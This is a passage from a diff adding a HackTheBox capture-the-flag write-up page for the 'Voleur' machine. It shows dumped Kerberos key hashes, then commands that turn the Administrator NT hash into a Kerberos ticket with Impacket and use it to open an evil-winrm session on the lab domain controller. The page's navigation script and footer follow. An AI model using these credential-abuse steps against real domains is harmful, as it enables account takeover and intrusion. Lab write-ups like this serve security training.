+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
+</span></span><span class="line"><span class="cl">voleur.htb<span class="se">\s</span>vc_winrm:des-cbc-md5:32b61fb92a7010ab
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></div><p>Administrator NT hash. Because NTLM is disabled, I can&rsquo;t use it directly for pass-the-hash over SMB or WinRM. But I can use it to get a Kerberos TGT - the KDC will accept the NT hash to derive the AS-REP encryption key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/voleur/Backups ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> getTGT.py -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/voleur/Backups ❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/administrator.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/voleur/Backups ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
+</span></span></code></pre></div><p>Root flag. The DPAPI part is what I&rsquo;ll remember from this one. A deleted user&rsquo;s saved credentials sitting in an archived profile, still intact, still decryptable. IT archived Todd&rsquo;s profile instead of wiping it and that single mistake handed over Jeremy.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
